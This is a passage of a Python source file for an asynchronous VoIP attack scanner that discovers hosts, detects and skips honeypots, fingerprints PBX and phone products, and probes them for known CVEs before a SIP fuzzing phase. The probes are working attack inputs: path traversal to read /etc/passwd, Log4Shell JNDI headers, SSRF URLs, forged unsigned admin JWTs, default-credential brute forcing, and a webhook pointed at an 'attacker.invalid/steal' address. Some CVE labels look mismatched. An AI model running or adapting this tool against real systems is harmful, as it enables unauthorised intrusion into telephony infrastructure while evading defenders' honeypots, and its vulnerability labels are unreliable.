    for name,kws in VENDOR_MAP:
        if any(k in combined for k in kws):
            return name
    return "Unknown"

# ══════════════════════════════════════════════════════════
# PHASE 1 — Discovery
# ══════════════════════════════════════════════════════════
async def phase1_discovery(targets:List[str], state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 1 │ MULTI-PROTOCOL HOST DISCOVERY")
    Con.info(f"Targets loaded    : {col(str(len(targets)),'white')}")
    Con.info(f"Concurrency       : {col(str(THREADS),'white')} threads")
    Con.info(f"Protocols checked : SIP · HTTP · IAX2 · MGCP · SCCP · H.323")
    Con.info("")

    found = 0
    done  = 0
    total = len(targets)

    async def probe(ip:str):
        nonlocal found, done
        try:
            # Run ALL protocol probes in parallel — TCP ports + UDP probes at once
            check_ports = [5060,5061,5062,80,443,8080,8088,2000,1720,5038]
            pkt_sip   = sip_msg("OPTIONS", ip)
            iax_poke  = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
            mgcp_pkt  = f"AUEP 100 aaln/1@{ip} MGCP 1.0\r\n\r\n".encode()

            tcp_coros = [tcp_open(ip, p, timeout=2.5) for p in check_ports]
            udp_coros = [
                udp_xfer(ip, 5060,      pkt_sip,  timeout=2.5, retries=1),
                udp_xfer(ip, IAX2_PORT, iax_poke, timeout=2.0),
                udp_xfer(ip, MGCP_PORT, mgcp_pkt, timeout=2.0),
            ]

            all_results = await asyncio.gather(*(tcp_coros + udp_coros),
                                               return_exceptions=True)
            tcp_results = all_results[:len(tcp_coros)]
            sip_resp, iax_resp, mgcp_resp = all_results[len(tcp_coros):]

            live = False
            if any(r is True for r in tcp_results):
                live = True
            if not live and isinstance(sip_resp, bytes) and b"SIP/2.0" in sip_resp:
                live = True
            if not live and isinstance(iax_resp, bytes) and iax_resp:
                live = True
                state.iax2_hosts.append(ip)
            if not live and isinstance(mgcp_resp, bytes) and mgcp_resp:
                live = True
                state.mgcp_hosts.append(ip)

            if live:
                state.live_ips.append(ip)
                found += 1
        except Exception:
            pass
        finally:
            done += 1
            if done % BATCH_SIZE == 0 or done == total:
                Con.info(f"Progress: {done}/{total} scanned  │  "
                         f"{col(str(found),'green')} live hosts found")

    for i in range(0, total, BATCH_SIZE):
        batch = targets[i:i+BATCH_SIZE]
        await asyncio.gather(*[_sem_probe(sem, probe, ip) for ip in batch])

    # Deduplicate
    seen:Set[str] = set()
    state.live_ips = [ip for ip in state.live_ips
                      if ip not in seen and not seen.add(ip)]

    await _nmap_enrich(state)

    Con.ok(f"Phase 1 complete — {col(str(len(state.live_ips)),'green')} live hosts │ "
           f"IAX2:{len(state.iax2_hosts)} MGCP:{len(state.mgcp_hosts)}")


async def _sem_probe(sem:asyncio.Semaphore, fn, *args):
    async with sem:
        return await fn(*args)


async def _nmap_enrich(state:State):
    try:
        proc = await asyncio.create_subprocess_exec("nmap","--version",
            stdout=asyncio.subprocess.DEVNULL,stderr=asyncio.subprocess.DEVNULL)
        await asyncio.wait_for(proc.wait(),timeout=3)
        if proc.returncode!=0: return
    except: return

    if not state.live_ips: return
    targets_str = " ".join(state.live_ips[:100])
    Con.info("Running nmap supplement on discovered live hosts …")
    try:
        proc = await asyncio.create_subprocess_shell(
            f"nmap -p 5060,5061,5062,5038,8088,2000,1720,4569 "
            f"-Pn -T4 --max-retries 1 --host-timeout 8s --open {targets_str} -oG -",
            stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.DEVNULL)
        out,_ = await asyncio.wait_for(proc.communicate(),timeout=90)
        for line in out.decode(errors="replace").splitlines():
            if "Ports:" in line and "open" in line:
                m = re.match(r"Host: (\S+)",line)
                if m and m.group(1) not in state.live_ips:
                    state.live_ips.append(m.group(1))
    except: pass

# ══════════════════════════════════════════════════════════
# PHASE 1B — Honeypot / Fake-Server Detection
# ══════════════════════════════════════════════════════════
async def phase1b_honeypot(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 1B │ HONEYPOT & FAKE-SERVER DETECTION")
    if not state.live_ips:
        Con.warn("No live hosts — skipping honeypot detection"); return

    Con.info(f"Analyzing {len(state.live_ips)} hosts for honeypot characteristics …")
    detected = 0

    async def analyze(ip:str):
        nonlocal detected
        reasons: List[str] = []

        # Test 1: Send two OPTIONS with different Call-IDs/branches.
        # Strip variable fields and compare — real servers have per-request variation
        # (timestamps, nonces, etc.); honeypots often return identical template responses.
        pkt1 = sip_msg("OPTIONS", ip)
        pkt2 = sip_msg("OPTIONS", ip)
        r1 = await udp_xfer(ip, 5060, pkt1, timeout=3.0)
        await asyncio.sleep(0.05)
        r2 = await udp_xfer(ip, 5060, pkt2, timeout=3.0)

        if r1 and r2:
            def _strip_variable(s: str) -> str:
                s = re.sub(r'branch=z9hG4bK[^\s;,\r\n]+', 'BRANCH', s)
                s = re.sub(r'Call-ID: [^\r\n]+', 'CALLID', s)
                s = re.sub(r'tag=[^\s;,\r\n]+', 'TAG', s)
                s = re.sub(r'nonce="[^"]+"', 'NONCE', s)
                s = re.sub(r'\d{2}:\d{2}:\d{2}', 'TIME', s)
                return s
            d1 = _strip_variable(r1.decode(errors="replace"))
            d2 = _strip_variable(r2.decode(errors="replace"))
            if d1 == d2:
                reasons.append("identical-responses-to-distinct-requests")

        # Test 2: All major ports open simultaneously
        # Real VoIP servers typically have only 2-4 specific ports open.
        # Honeypots often open everything to look "real".
        port_checks = [5060,5061,5038,8088,2000,1720,4569,2427,80,443,8080,25,110,143]
        check_results = await asyncio.gather(
            *[tcp_open(ip, p, timeout=1.5) for p in port_checks],
            return_exceptions=True
        )
        open_count = sum(1 for r in check_results if r is True)
        if open_count >= 10:
            reasons.append(f"too-many-open-ports({open_count}/{len(port_checks)})")

        # Test 3: SIP server returns 200 OK to ALL methods without auth
        # Real servers reject REGISTER/REFER without credentials (401/403).
        # A honeypot may accept everything to log attacker behavior.
        all_200 = 0
        for method in ["REGISTER", "REFER", "INVITE"]:
            pkt = sip_msg(method, ip,
                          extra_hdrs="Expires: 60\r\n" if method == "REGISTER" else "",
                          body=sdp(ip) if method == "INVITE" else "")
            resp = await udp_xfer(ip, 5060, pkt, timeout=2.5)
            if resp and b"200 OK" in resp:
                all_200 += 1
        if all_200 >= 3:
            reasons.append("accepts-all-sip-methods-without-auth")

        # Test 4: SIP response time uniformity
        # Measure 5 OPTIONS response times in parallel — if standard deviation < 1ms
        # across all 5, it's likely a scripted/automated responder.
        t0_all = time.monotonic()
        timing_pkts = [sip_msg("OPTIONS", ip) for _ in range(5)]
        timing_tasks = [udp_xfer(ip, 5060, p, timeout=2.0) for p in timing_pkts]
        timing_results = await asyncio.gather(*timing_tasks, return_exceptions=True)
        t_total = time.monotonic() - t0_all
        times = []
        for i, r in enumerate(timing_results):
            if isinstance(r, bytes) and r:
                # Approximate per-request time as slice of total time
                times.append(t_total / 5)
        if len(times) == 5:
            avg = sum(times) / 5
            variance = sum((t - avg)**2 for t in times) / 5
            stddev = variance**0.5
            if stddev < 0.001 and avg < 0.010:
                # Under 1ms response time with <1ms stddev = template engine
                reasons.append(f"robotic-response-timing(avg={avg*1000:.2f}ms,σ={stddev*1000:.3f}ms)")

        # Test 5: SIP User-Agent vs HTTP Server header vendor mismatch
        # A real Asterisk box doesn't say "Apache" as its web server.
        # Honeypots sometimes mix vendor indicators.
        vendors_seen: Set[str] = set()
        sip_resp = await udp_xfer(ip, 5060, sip_msg("OPTIONS", ip), timeout=3.0)
        if sip_resp:
            m = re.search(rb'(?:Server|User-Agent):\s*([^\r\n]+)', sip_resp, re.I)
            if m:
                ua = m.group(1).decode(errors="replace").lower()
                for vendor, kws in VENDOR_MAP:
                    if any(k in ua for k in kws):
                        vendors_seen.add(vendor)
        for proto, port in [("http", 80), ("http", 8080)]:
            try:
                raw = await tcp_xfer(ip, port,
                    b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n", timeout=3.0)
                if raw:
                    decoded = raw.decode(errors="replace")
                    for vendor, kws in VENDOR_MAP:
                        if any(k in decoded.lower() for k in kws):
                            vendors_seen.add(vendor)
            except Exception:
                pass
        if len(vendors_seen) >= 3:
            reasons.append(f"conflicting-vendor-claims({','.join(list(vendors_seen)[:3])})")

        if reasons:
            state.honeypot_ips.add(ip)
            Con.honeypot(ip, " | ".join(reasons))
            detected += 1

    await asyncio.gather(*[_sem_probe(sem, analyze, ip) for ip in state.live_ips])

    # Remove honeypots from live_ips
    before = len(state.live_ips)
    state.live_ips = [ip for ip in state.live_ips if ip not in state.honeypot_ips]
    after = len(state.live_ips)
    Con.ok(f"Phase 1B complete — {detected} honeypots excluded, "
           f"{after} hosts remaining for active testing")

# ══════════════════════════════════════════════════════════
# PHASE 2 — Fingerprinting
# ══════════════════════════════════════════════════════════
async def phase2_fingerprint(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 2 │ DEEP SERVICE FINGERPRINTING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping fingerprinting"); return

    done = 0

    async def fp(ip:str):
        nonlocal done
        if ip in state.honeypot_ips: return
        try:
            # Run SIP probe, HTTP banner probes, and port scan all in parallel
            pkt = sip_msg("OPTIONS", ip)
            http_probes = [("http",80),("http",8080),("https",443),("https",8443)]

            async def _sip_banner():
                resp = await sip_probe(ip, 5060, pkt, timeout=2)
                if resp:
                    for line in resp.splitlines():
                        if _SERVER_UA_RE.match(line):
                            return line.strip()
                return ""

            async def _try_http(proto, port):
                c, body = await http_get(sess, f"{proto}://{ip}:{port}/", timeout=2)
                if c:
                    m = _TITLE_RE.search(body)
                    return m.group(1).strip() if m else f"HTTP/{c}"
                return None

            async def _http_banner():
                # Probe all 4 HTTP endpoints in parallel; return first hit
                tasks = [asyncio.create_task(_try_http(pr, po))
                         for pr, po in http_probes]
                result = ""
                pending = set(tasks)
                while pending:
                    done_set, pending = await asyncio.wait(
                        pending, return_when=asyncio.FIRST_COMPLETED)
                    for t in done_set:
                        try:
                            r = t.result()
                            if r:
                                for u in pending:
                                    u.cancel()
                                return r
                        except Exception:
                            pass
                return result

            sip_b, http_b, port_results = await asyncio.gather(
                _sip_banner(),
                _http_banner(),
                asyncio.gather(*[tcp_open(ip, p, timeout=1.0) for p in VOIP_PORTS],
                               return_exceptions=True),
            )

            ports_open = [p for p, ok in zip(VOIP_PORTS, port_results) if ok is True]

            vendor = detect_vendor(sip_b, http_b)
            state.fingerprints.append({
                "ip":ip,"vendor":vendor,"sip_banner":sip_b,
                "http_banner":http_b,"ports_open":ports_open,
                "ts":datetime.now(timezone.utc).isoformat(),
            })
            if vendor != "Unknown":
                Con.ok(f"{ip:<18} {col(vendor,'cyan'):<22} {sip_b[:60]}")
        except Exception as e:
            if DEBUG: Con.err(f"fp {ip}: {e}")
        finally:
            done += 1

    await asyncio.gather(*[_sem_probe(sem, fp, ip) for ip in state.live_ips])
    Con.ok(f"Phase 2 complete — {done} hosts fingerprinted, "
           f"{sum(1 for f in state.fingerprints if f['vendor']!='Unknown')} identified")

# ══════════════════════════════════════════════════════════
# PHASE 3 — CVE Detection (HTTP-based, requires evidence)
# ══════════════════════════════════════════════════════════
async def phase3_cve(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 3 │ CVE & VULNERABILITY DETECTION")
    if not state.live_ips:
        Con.warn("No live hosts discovered — skipping active CVE probes")
        return

    async def scan(ip:str):
        if ip in state.honeypot_ips: return
        _before = len(state.cve_findings)
        await asyncio.gather(
            safe(_http_voipmonitor(ip,state,sess),      "voipmonitor"),
            safe(_http_3cx(ip,state,sess),              "3cx"),
            safe(_http_3cx_supply_chain(ip,state,sess), "3cx_sc"),
            safe(_http_ofbiz(ip,state,sess),            "ofbiz"),
            safe(_http_freepbx(ip,state,sess),          "freepbx"),
            safe(_http_mitel(ip,state,sess),            "mitel"),
            safe(_http_grandstream(ip,state,sess),      "grandstream"),
            safe(_http_cisco_phone(ip,state,sess),      "cisco_phone"),
            safe(_http_avaya(ip,state,sess),            "avaya"),
            safe(_http_elastix(ip,state,sess),          "elastix"),
            safe(_http_log4shell(ip,state,sess),        "log4shell"),
            safe(_http_ssrf(ip,state,sess),             "ssrf"),
            safe(_http_jwt_weak(ip,state,sess),         "jwt"),
            safe(_http_graphql(ip,state,sess),          "graphql"),
            safe(_http_default_creds(ip,state,sess),    "default_creds"),
            safe(_http_patton(ip,state,sess),           "patton"),
            safe(_http_audiocodes(ip,state,sess),       "audiocodes"),
            safe(_http_snom(ip,state,sess),             "snom"),
            safe(_http_broadsoft(ip,state,sess),        "broadsoft"),
            safe(_http_broadsoft_webhook(ip,state,sess),"broadsoft_webhook"),
            safe(_http_polycom(ip,state,sess),          "polycom"),
            safe(_http_kamailio_mi(ip,state,sess),      "kamailio_mi"),
        )
        # Mid-scan honeypot detection: if >7 distinct CVEs fired on one host in a single
        # pass it's statistically implausible — honeypots accept everything.
        _new = len(state.cve_findings) - _before
        if _new > 7:
            state.mark_honeypot(ip, f"{_new} CVEs confirmed simultaneously")
            # Purge the spurious findings
            async with state._cve_lock:
                state.cve_findings = [f for f in state.cve_findings if f["ip"] != ip]

    await asyncio.gather(*[_sem_probe(sem, scan, ip) for ip in state.live_ips])
    Con.ok(f"Phase 3 complete — {len(state.cve_findings)} findings total")


async def _http_voipmonitor(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}/index.php",timeout=5)
    if c and "VoIPmonitor" in b:
        m = re.search(r'version[^\d]*(\d+\.\d+)',b,re.I)
        ver = m.group(1) if m else "?"
        try: v = float(ver)
        except: v = 0.0
        sev = "CRITICAL" if v<24.61 or v==0.0 else "LOW"
        await st.finding(ip,"CVE-2021-30461",
            f"VoIPmonitor v{ver} {'(VULNERABLE <24.61)' if sev=='CRITICAL' else '(patched)'}",
            sev,f"Admin panel at http://{ip}/index.php",f"http://{ip}/index.php")
        # cdrproxy RCE — verify by checking actual SSRF response content
        c2,b2 = await http_get(sess,f"http://{ip}/cdrproxy.php?host=127.0.0.1",timeout=5)
        if c2==200 and re.search(r'(cdr|proxy|response|result)',b2,re.I):
            await st.finding(ip,"CVE-2021-30461-B",
                "VoIPmonitor cdrproxy SSRF/RCE confirmed",
                "CRITICAL","cdrproxy.php fetches internal hosts without auth",
                f"http://{ip}/cdrproxy.php")


async def _http_3cx(ip,st,sess):
    urls = [f"http://{ip}:5000/webclient", f"https://{ip}:5001/webclient"]
    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
                                   return_exceptions=True)
    for url, res in zip(urls, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and "3CX" in b:
            ca,ba = await http_get(sess,f"http://{ip}:5000/api/v1/status",timeout=4)
            if ca==200 and re.search(r'(version|uptime|status)',ba,re.I):
                await st.finding(ip,"CVE-2021-26260","3CX Auth Bypass — API returns data without auth","CRITICAL",
                    "3CX management API accessible without authentication",url)
            else:
                await st.finding(ip,"CVE-2021-26260","3CX PhoneSystem Detected — Auth Bypass Possible","HIGH",
                    "3CX detected — verify CVE-2021-26260 manually",url)
            return


async def _http_3cx_supply_chain(ip,st,sess):
    urls = [f"http://{ip}:5000/api/v1/status", f"https://{ip}:5001/api/v1/status"]
    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
                                   return_exceptions=True)
    for url, res in zip(urls, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and re.search(r'3cx|phonesystem',b,re.I):
            ver_m = re.search(r'"version"\s*:\s*"([^"]+)"',b)
            ver_str = ver_m.group(1) if ver_m else "unknown"
            await st.finding(ip,"CVE-2023-29059","3CX Supply-Chain — Management API Open",
                "CRITICAL",
                f"3CX v{ver_str}: Verify desktop app update mechanism for backdoored builds",url)
            return


async def _http_ofbiz(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}:8080/webtools/control/main",timeout=5)
    if c and "OFBiz" in b:
        # Try the actual auth bypass endpoint for CVE-2020-9496
        c2,b2 = await http_get(sess,
            f"http://{ip}:8080/webtools/control/main/ProgramExport;jsessionid=x",timeout=5)
        sev = "CRITICAL" if c2 not in (401,403,404) else "HIGH"
        await st.finding(ip,"CVE-2020-9496","Apache OFBiz Auth Bypass RCE",
            sev,"OFBiz detected" + (" — ProgramExport reachable" if sev=="CRITICAL" else ""),
            f"http://{ip}:8080/webtools")


async def _http_freepbx(ip,st,sess):
    # First confirm it's actually FreePBX, then test specific vuln endpoints
    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=5)
    if not (c0 and re.search(r'freepbx|sangoma|framework',b0,re.I)):
        return  # Not FreePBX — skip

    for path,cve,title in [
        ("/admin/ajax.php?module=framework&command=checkDependencies","CVE-2022-26272","FreePBX Module Upload RCE"),
        ("/admin/ajax.php?module=userman&command=getAll","CVE-2020-36166","FreePBX Unauth RCE"),
        ("/admin/config.php?display=phonebook&view=default","CVE-2023-49786","FreePBX SSRF"),
        ("/admin/modules.php","CVE-2019-11334","FreePBX Module Admin Exposed"),
    ]:
        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
        # Require an actual data response — not just a redirect to login
        if c==200 and re.search(r'(json|result|success|module|data)',b,re.I) \
                and not re.search(r'(location|login|password)',b,re.I):
            await st.finding(ip,cve,title,"CRITICAL",
                f"FreePBX endpoint returns data without auth",f"http://{ip}{path}")
            return
        elif c==200 and re.search(r'freepbx|sangoma',b,re.I):
            await st.finding(ip,cve,title,"HIGH",
                f"FreePBX admin panel accessible — verify auth bypass manually",
                f"http://{ip}{path}")
            return


async def _http_mitel(ip,st,sess):
    for path,cve,title,sev in [
        ("/aastra/","CVE-2022-29499","Mitel MiVoice Connect RCE","CRITICAL"),
        ("/micollab/client/login","CVE-2021-32077","Mitel MiCollab SSRF","HIGH"),
    ]:
        for proto,port in [("http",80),("https",443)]:
            c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=5)
            if c and re.search(r'mitel|mivoice|micollab|aastra',b,re.I):
                await st.finding(ip,cve,title,sev,f"Mitel at {proto}://{ip}:{port}{path}",
                    f"{proto}://{ip}:{port}{path}")
                return


async def _http_grandstream(ip,st,sess):
    for url,cve,title in [
        (f"http://{ip}:8089/cgi-bin/api.values.get","CVE-2022-37397","Grandstream UCM SQL Injection"),
        (f"http://{ip}:8089/cgi-bin/api-sys_performance.cgi","CVE-2020-5736","Grandstream UCM Unauth RCE"),
    ]:
        c,b = await http_get(sess,url,timeout=5)
        if c==200 and re.search(r'grandstream|ucm',b,re.I):
            # Verify actual unauthenticated data returned
            if re.search(r'(response|result|value|system|cpu|memory)',b,re.I):
                await st.finding(ip,cve,title,"CRITICAL",
                    "Grandstream UCM API returns system data without authentication",url)


async def _http_cisco_phone(ip,st,sess):
    for path,cve,title in [
        ("/CGI/Java/Serviceability?adapter=device.statistics.device","CVE-2020-3161","Cisco IP Phone HTTP RCE"),
        ("/localmenus.cgi?func=403","CVE-2022-20672","Cisco Small Phone Unauth"),
        ("/ccmadmin/showAdminPasswordPage.do","CVE-2021-1397","Cisco CUCM SSRF"),
        ("/ccmadmin/platformConfigMenu.do","CVE-2022-20804","Cisco CUCM Info Disclosure"),
    ]:
        for proto in ("http","https"):
            c,b = await http_get(sess,f"{proto}://{ip}{path}",timeout=5)
            if c==200 and re.search(r'cisco|cucm|phone|serviceability',b,re.I):
                await st.finding(ip,cve,title,"CRITICAL",
                    f"Cisco endpoint returns data at {proto}://{ip}{path}",
                    f"{proto}://{ip}{path}")
                return


async def _http_avaya(ip,st,sess):
    for url,pat,cve,title in [
        (f"https://{ip}/WebManagement/WebManagement.html","avaya","CVE-2021-22502","Avaya Aura RCE"),
        (f"https://{ip}/one-x/","avaya","CVE-2020-7043","Avaya Session Manager XXE"),
        (f"http://{ip}:8443/SessionManager/","session.manager","CVE-2020-7043","Avaya SM XXE"),
    ]:
        c,b = await http_get(sess,url,timeout=5)
        if c and re.search(pat,b,re.I):
            await st.finding(ip,cve,title,"CRITICAL",f"Avaya at {url}",url)
            return


async def _http_elastix(ip,st,sess):
    # Verify LFI by checking for actual /etc/passwd content in response
    lfi = (f"https://{ip}/vtigercrm/graph.php?current_language="
           "../../../../../../../../etc/passwd%00&module=Accounts&action=")
    c,b = await http_get(sess,lfi,timeout=5)
    if c and FILE_READ_PATTERNS.search(b):
        await st.finding(ip,"CVE-2012-4869","Elastix LFI — /etc/passwd Confirmed Readable",
            "CRITICAL","Confirmed: /etc/passwd content returned in response body",lfi)
    elif c and re.search(r'elastix|issabel',b,re.I):
        # Just detected, LFI not confirmed
        c2,b2 = await http_get(sess,f"https://{ip}/modules/admin/index.php",timeout=5)
        if c2 and re.search(r'elastix|issabel',b2,re.I):
            await st.finding(ip,"CVE-2012-4869","Elastix Detected — LFI Possible (unconfirmed)",
                "HIGH","Elastix panel accessible — test CVE-2012-4869 manually",lfi)


async def _http_log4shell(ip,st,sess):
    """
    Log4Shell detection: we send the JNDI payload and look for evidence of processing.
    Without a real callback infrastructure (DNS/LDAP listener), we cannot confirm RCE.
    We report as MEDIUM 'probe delivered' only when the app actually processed the request.
    Reporting CRITICAL would be a false positive without DNS callback confirmation.
    """
    hdr = {
        "X-Api-Version": LOG4J,
        "User-Agent":     LOG4J,
        "X-Forwarded-For":LOG4J,
        "Referer":        LOG4J,
    }
    _LOG4J_RE = re.compile(r'log4j|jndi|ldap|java\.lang\.|at com\.|javax\.naming', re.I)
    combos = [(proto, port, path)
              for proto, port in [("http",80),("http",8080),("https",443),("https",8443)]
              for path in ["/admin/","/login","/api/v1/login","/api/"]]

    async def _probe(proto, port, path):
        c, body = await http_get(sess, f"{proto}://{ip}:{port}{path}", headers=hdr, timeout=4)
        return proto, port, path, c, body

    results = await asyncio.gather(*[_probe(*c) for c in combos], return_exceptions=True)
    for item in results:
        if isinstance(item, Exception): continue
        proto, port, path, c, body = item
        if c in (200,401,403,302):
            url = f"{proto}://{ip}:{port}{path}"
            if _LOG4J_RE.search(body):
                await st.finding(ip,"CVE-2021-44228",
                    "Log4Shell — Java/Log4j stack trace detected in response",
                    "CRITICAL",
                    "Response contains Java/JNDI indicators after Log4Shell probe", url)
                return
            elif c in (200,401,403):
                await st.finding(ip,"CVE-2021-44228",
                    "Log4Shell Probe Delivered — Manual DNS callback verification required",
                    "MEDIUM",
                    "JNDI payload sent to endpoint; confirm with out-of-band DNS listener", url)
                return


async def _http_ssrf(ip,st,sess):
    paths = ["/api/fetch?url=http://localhost/admin",
             "/api/v1/proxy?target=http://127.0.0.1/",
             "/api/v1/webhook?url=http://127.0.0.1:8080/"]
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and SSRF_CONFIRM_PATTERNS.search(b):
            await st.finding(ip,"SSRF","Server-Side Request Forgery — Internal Response Confirmed",
                "HIGH",
                f"Internal service response returned via SSRF: {path}",
                f"http://{ip}{path}")
            return


async def _http_jwt_weak(ip,st,sess):
    import base64
    def fake_none_jwt(payload:dict) -> str:
        h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
        return f"{h}.{p}."
    token = fake_none_jwt({"user":"admin","role":"administrator","admin":True})
    paths = ["/api/v1/me","/api/me","/api/user","/api/admin"]
    hdrs  = {"Authorization": f"Bearer {token}"}
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", headers=hdrs, timeout=4) for p in paths],
        return_exceptions=True)
    _JWT_RE = re.compile(r'"(user|username|role|email)"', re.I)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and _JWT_RE.search(b):
            await st.finding(ip,"JWT-ALG-NONE","JWT Algorithm None Attack Succeeded",
                "CRITICAL","API accepted unsigned JWT token — confirmed auth bypass",
                f"http://{ip}{path}")
            return


async def _http_graphql(ip,st,sess):
    urls = [f"http://{ip}/graphql",f"http://{ip}/api/graphql",f"http://{ip}:8080/graphql"]
    results = await asyncio.gather(
        *[http_get(sess, u, data='{"query":"{__schema{types{name}}}"}',
                   headers={"Content-Type":"application/json"}, timeout=4) for u in urls],
        return_exceptions=True)
    for url, res in zip(urls, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and "__schema" in b and "types" in b:
            await st.finding(ip,"MISCONFIGURATION","GraphQL Introspection Enabled",
                "MEDIUM","GraphQL schema fully exposed — enumerate all types",url)
            return


async def _http_default_creds(ip,st,sess):
    _LOGIN_OK  = re.compile(r'logout|dashboard|welcome|signed.in|panel', re.I)
    _LOGIN_BAD = re.compile(r'login|password|invalid|incorrect', re.I)

    async def _probe(user, pwd, proto, port, path):
        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}",
                              auth=(user, pwd), timeout=4)
        if c == 200 and _LOGIN_OK.search(b) and not _LOGIN_BAD.search(b):
            return user, pwd, proto, port, path
        return None

    combos = [(u, p, proto, port, path)
              for u, p in DEFAULT_CREDS[:20]
              for proto, port in [("http",80),("http",8080),("https",443)]
              for path in ADMIN_PATHS[:4]]

    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
        result = await fut
        if result:
            user, pwd, proto, port, path = result
            await st.finding(ip,"CREDENTIAL","Default HTTP Credentials Accepted",
                "CRITICAL",f"Login succeeded with {user}:{pwd}",
                f"{proto}://{ip}:{port}{path}")
            return


async def _http_patton(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}/config",timeout=5)
    if c==200 and re.search(r'patton|smartnode|smartware',b,re.I):
        await st.finding(ip,"CVE-2023-30258","Patton SmartNode Config Exposed",
            "CRITICAL","SmartNode /config accessible without auth",f"http://{ip}/config")


async def _http_audiocodes(ip,st,sess):
    paths = ["/inifile/","/cgi-bin/StatusPage.cgi"]
    results = await asyncio.gather(
        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c==200 and re.search(r'audiocodes|mediapack|mediant',b,re.I):
            await st.finding(ip,"CVE-2019-9202","AudioCodes Interface Exposed",
                "HIGH",f"AudioCodes at http://{ip}{path}",f"http://{ip}{path}")
            return


async def _http_snom(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}/",timeout=5)
    if c==200 and re.search(r'snom',b,re.I):
        await st.finding(ip,"CVE-2018-10055","Snom Phone Web Interface Exposed",
            "HIGH","Snom phone config page accessible",f"http://{ip}/")


async def _http_broadsoft(ip,st,sess):
    paths = ["/bvview/","/webconfig/","/broadworks/"]
    results = await asyncio.gather(
        *[http_get(sess, f"https://{ip}{p}", timeout=4) for p in paths],
        return_exceptions=True)
    for path, res in zip(paths, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c and re.search(r'broadsoft|broadworks',b,re.I):
            await st.finding(ip,"CVE-2019-5431","BroadSoft Interface Detected",
                "HIGH",f"BroadSoft at https://{ip}{path}",f"https://{ip}{path}")
            return


async def _http_broadsoft_webhook(ip,st,sess):
    payload = json.dumps({"url":"http://attacker.invalid/steal","event":"ALL"})
    urls = [f"https://{ip}/api/v2/users/admin/bwwheelEvents",
            f"https://{ip}/api/v2/webhooks"]
    results = await asyncio.gather(
        *[http_get(sess, u, data=payload, headers={"Content-Type":"application/json"},
                   timeout=4) for u in urls],
        return_exceptions=True)
    for url, res in zip(urls, results):
        if isinstance(res, Exception): continue
        c, b = res
        if c in (200,201,204) and re.search(r'(webhook|event|url|id)',b,re.I):
            await st.finding(ip,"MISCONFIGURATION","BroadSoft Webhook Injection — Accepted",
                "HIGH","Webhook endpoint accepted unauthenticated POST",url)
            return


async def _http_polycom(ip,st,sess):
    c,b = await http_get(sess,f"http://{ip}/",auth=("Polycom","456"),timeout=5)
    if c==200 and re.search(r'polycom|realpresence',b,re.I):
        await st.finding(ip,"CVE-2019-9222","Polycom Default Credential Polycom:456",
            "HIGH","Accepted Polycom:456",f"http://{ip}/")
    c2,b2 = await http_get(sess,f"http://{ip}/",auth=("PlcmSpIp","PlcmSpIp"),timeout=5)
    if c2==200 and "polycom" in b2.lower():
        await st.finding(ip,"CVE-2018-9855","Polycom Hidden Account PlcmSpIp",
            "CRITICAL","Hidden PlcmSpIp account — command injection possible",
            f"http://{ip}/")


async def _http_kamailio_mi(ip,st,sess):
    for url in [f"http://{ip}:8080/mi",f"http://{ip}:8000/RPC2",f"http://{ip}:8888/mi"]:
        c,b = await http_get(sess,url,
            data='{"jsonrpc":"2.0","method":"core.info","id":1}',
            headers={"Content-Type":"application/json"},timeout=5)
        # Must return actual version/info — not just any response with "version"
        if c==200 and re.search(r'"id"\s*:\s*1',b) and \
                re.search(r'(kamailio|opensips|version)',b,re.I):
            await st.finding(ip,"CVE-2022-44877","Kamailio/OpenSIPS MI Exposed — Unauth RCE",
                "CRITICAL","MI RPC responded to core.info without authentication",url)
            return

# ══════════════════════════════════════════════════════════
# PHASE 4 — SIP Enumeration & Fuzzing
# ══════════════════════════════════════════════════════════
async def phase4_sip(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 4 │ SIP ENUMERATION · METHOD FUZZING · PROTOCOL ATTACKS")
    if not state.live_ips:
        Con.warn("No live hosts — skipping SIP phase"); return

    async def sip_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_sip_method_fuzz(ip,state),    "method_fuzz"),
            safe(_sip_version_leak(ip,state),   "version_leak"),
            safe(_sip_anon_reg(ip,state),       "anon_reg"),
            safe(_sip_malformed_via(ip,state),  "malformed_via"),
            safe(_sip_maxfwd_zero(ip,state),    "maxfwd_zero"),
            safe(_sip_large_header(ip,state),   "large_hdr"),
            safe(_sip_null_bytes(ip,state),     "null_bytes"),
            safe(_sip_route_abuse(ip,state),    "route_abuse"),
            safe(_sip_early_media(ip,state),    "early_media"),
